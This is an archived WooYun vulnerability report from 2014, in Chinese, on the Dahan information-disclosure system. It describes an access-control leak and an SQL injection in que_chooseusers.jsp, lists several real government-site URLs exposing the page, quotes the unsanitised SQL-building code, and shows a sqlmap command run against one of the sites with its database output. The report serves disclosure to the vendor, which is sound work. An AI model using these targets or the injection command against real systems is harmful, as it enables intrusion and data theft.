{"id": 2059, "wybug_id": "wooyun-2014-061287", "wybug_title": "大汉版通系统严重信息泄露+SQL注入", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "路人甲", "wybug_date": "2014-05-18 22:07", "wybug_open_date": "2014-08-16 22:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向公众公开  简要描述： 大汉版通系统越权导致严重的信息泄露，可获取到所有的用户等，且存在SQL注入 详细说明：  该系统为：大汉信息公开系统(xxgk)#1 漏洞文件\n/xxgk/m_5_1/govdiropen/que_chooseusers.jsp\n随机在互联网上选择几个案例..下面是信息泄露的\nhttp://xxgk.lyg.gov.cn/xxgk/m_5_1/govdiropen/que_chooseusers.jsp\n\n\n\nhttp://xxgk.lucheng.gov.cn//xxgk/m_5_1/govdiropen/que_chooseusers.jsp\n\n\n\nhttp://xxgk.gaomi.gov.cn:82/xxgk/m_5_1/govdiropen/que_chooseusers.jsp\n\n\n\nhttp://xxgk.qingzhou.gov.cn/xxgk/m_5_1/govdiropen/que_chooseusers.jsp\n\n\n#2 SQL注入漏洞代码如下\n<%\t//当前页数\tString currpage = Convert.getParameter(request, \"currpage\");\tcurrpage = (currpage.equals(\"\")) ? \"1\" : currpage;\t\t//\t**where条件**//\tStringBuffer strSqlCondition = new StringBuffer(128);//条件\tString que_keywords = Convert.getParameter(request, \"que_keywords\");\tString que_usergroupid = Convert.getParameter(request, \"que_usergroupid\");//这里接收参数\tString que_usergroupname = Convert.getParameter(request, \"que_usergroupname\");\tString que_keywords1 = Convert.getParameter(request, \"que_keywords1\");\tString que_scope = Convert.getParameter(request, \"que_scope\");\tque_keywords = (que_keywords1.length() > 0) ? que_keywords1 : que_keywords;//高级检索的关键字优先\t\tstrSqlCondition.append(\"  a.c_id !='00000' AND vc_usertype='0' \");\t//admin用户不出来\t\tif(que_keywords.length()>0){\t\tif(que_scope.length()>0){\t\t\tif(que_scope.equals(\"vc_username\")){\t\t\t\tstrSqlCondition.append(\" AND vc_username like '%\"+que_keywords+\"%' \");\t\t\t\t}\t\t\tif(que_scope.equals(\"vc_loginid\")){\t\t\t\tstrSqlCondition.append(\" AND vc_loginid like '%\"+que_keywords+\"%' \");\t\t\t}\t\t}else {\t\t\tstrSqlCondition.append(\" AND (vc_username like '%\"+que_keywords+\t\t\t               \"%' OR vc_loginid like '%\"+que_keywords+\"%' )\");\t\t}\t}\t\t\tif(que_usergroupid.length()>0){\t\tstrSqlCondition.append(\" AND vc_usergroupid = '\"+que_usergroupid+\"' \");//带入了SQL查询\t}}\n参数均没有过滤，直接进入了SQL语句，造成了SQL注入#3 SQL测试随便选取一个连接进行测试\nhttp://xxgk.weifang.gov.cn//xxgk/m_5_1/govdiropen/que_chooseusers.jsp?que_usergroupid=11\n\n\n   漏洞证明：  #数据\nC:\\>sqlmap.py -u \"http://xxgk.weifang.gov.cn//xxgk/m_5_1/govdiropen/que_chooseusers.jsp?que_usergroupid=11\" --current-dbweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000[14:39:40] [INFO] fetching current database[14:39:40] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..[14:39:48] [WARNING] it is very important not to stress the network adapter's bandwidth during usage of time-based queries[14:39:58] [INFO] due to good response times you can try to adjust the time-delay to a more appropriate value (e.g. --time-sec=1)[14:41:29] [CRITICAL] unable to connect to the target url or proxy, sqlmap is going to retry the requestkcurrent database:    'xxgk'\n   修复方案：  你们懂   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-05-19 09:59 厂商回复： 感谢关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}